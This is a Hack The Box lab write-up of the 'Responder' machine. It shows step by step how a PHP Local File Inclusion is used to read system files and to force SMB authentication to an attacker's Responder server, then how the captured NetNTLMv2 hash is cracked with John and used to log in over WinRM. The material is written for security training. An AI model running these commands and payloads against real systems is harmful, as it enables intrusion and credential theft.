HTB – Responder Write-up

Prepared by: dotguy

��� Introduction

Windows dominates global OS usage due to its accessibility and GUI‑driven design, accounting for roughly 85% of the market. Most enterprise environments rely on Active Directory, which uses NTLM and Kerberos for authentication.

Despite known weaknesses, NTLM remains widely deployed, mainly for compatibility with legacy systems.

This lab demonstrates how a Local File Inclusion (LFI) vulnerability on a Windows webserver can be used to trigger an SMB authentication attempt, allowing us to:

Capture the NetNTLMv2 challenge‑response hash using Responder

Crack the hash using John the Ripper

Gain access via WinRM

Obtain the final flag

Understanding these internal mechanisms is essential for real‑world exploitation.

1. Enumeration
Nmap Scan

We begin by scanning all TCP ports:

nmap -p- --min-rate 1000 -sV 10.129.128.223


Flags explained:

Flag	Meaning
-p-	Scan all 65,535 ports
--min-rate 1000	Increase speed by sending ≥1000 packets/sec
-sV	Detect service versions
How Nmap detects services

Nmap uses a built‑in service fingerprint database and probes each port for service‑specific responses.
It’s often accurate, but not perfect.

Scan Findings

OS: Windows

Open Ports:

80 → Apache HTTP

5985 → WinRM

What is WinRM?

Windows Remote Management allows:

Remote command execution

Remote configuration

PowerShell remoting

With valid credentials, WinRM gives us a full Windows shell.

2. Website Enumeration

Visiting the IP redirected the browser to:

http://unika.htb


The host could not resolve the name, meaning name‑based virtual hosting is in use.

Fix Host Resolution

Add to /etc/hosts:

echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts

Site Behavior

The landing page includes a language switch (EN / FR), which updates the URL:

?page=french.html


This suggests a possible file inclusion mechanism.

3. Local File Inclusion (LFI)

Dynamic sites often use PHP’s include() function.
If user input isn’t sanitized, an attacker can include unintended files via directory traversal (../).

Testing for LFI

Try accessing the Windows hosts file:

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts


✔ Output confirms LFI is working.

Why LFI Works

PHP backend code is likely doing:

include($_GET['page']);


With no sanitization, any file path can be passed.

Example (PHP include mechanic)

vars.php

<?php
$color = 'green';
$fruit = 'apple';
?>


test.php

<?php
echo "A $color $fruit"; // output: "A"
include 'vars.php';
echo "A $color $fruit"; // output: "A green apple"
?>

4. NTLM Authentication Overview

NTLM is Microsoft’s challenge‑response authentication protocol.

NTLM Process

Client sends username + domain

Server sends random challenge

Client encrypts challenge with NT hash of password

Server retrieves stored password hash

If encrypted values match → authentication succeeds

Terminology Clarification
Term	Meaning
Hash	One‑way output of a hashing algorithm
NTHash	Used to store passwords in Windows SAM
NetNTLMv2	Challenge‑response format used over the network

NetNTLMv2 is often called a “hash,” but it isn’t truly a hash — just a value we can attack like one.

5. Using Responder to Capture NetNTLMv2

By exploiting LFI, we can force the Windows host to authenticate to our malicious SMB server.

PHP Restrictions

Even when:

allow_url_fopen = Off

allow_url_include = Off

PHP still allows SMB URLs, enabling this attack.

Responder Overview

Responder creates a malicious SMB server.
When Windows tries to authenticate:

Responder issues a challenge

Windows encrypts it

Responder captures the NetNTLMv2 challenge‑response

6. Starting Responder

Clone the tool:

git clone https://github.com/lgandx/Responder


Check network interface:

ifconfig


Start Responder:

sudo python3 Responder.py -I tun0


or on Kali:

sudo responder -I tun0

7. Triggering SMB Authentication via LFI

Visit:

http://unika.htb/?page=//10.10.14.25/somefile


(Ensure the URL starts with http:// or browser may search instead.)

Windows attempts to load the SMB resource → authentication occurs → Responder captures the hash.

Captured Output Example

Responder returns a NetNTLMv2 hash for Administrator.

8. Cracking the Hash With John the Ripper

Save the hash:

echo "Administrator::<HASH_GOES_HERE>" > hash.txt


Run John:

john -w=/usr/share/wordlists/rockyou.txt hash.txt


John tests each word, encrypting the challenge and comparing outputs.

Cracked Password
password: badminton

9. WinRM Access (Evil-WinRM)

Connect to WinRM using the cracked Administrator password:

evil-winrm -i 10.129.136.91 -u administrator -p badminton

10. Capture the Flag

Navigate to the target user's desktop:

type C:\Users\mike\Desktop\flag.txt


��� Flag obtained!

✔️ Conclusion

In this lab, we:

Identified a web-based LFI vulnerability

Forced SMB authentication to our attacker machine

Captured a NetNTLMv2 challenge-response

Cracked it using John the Ripper

Logged into the target machine via WinRM

Retrieved the final flag

This demonstrates how a seemingly harmless LFI can escalate into complete system compromise through NTLM abuse.
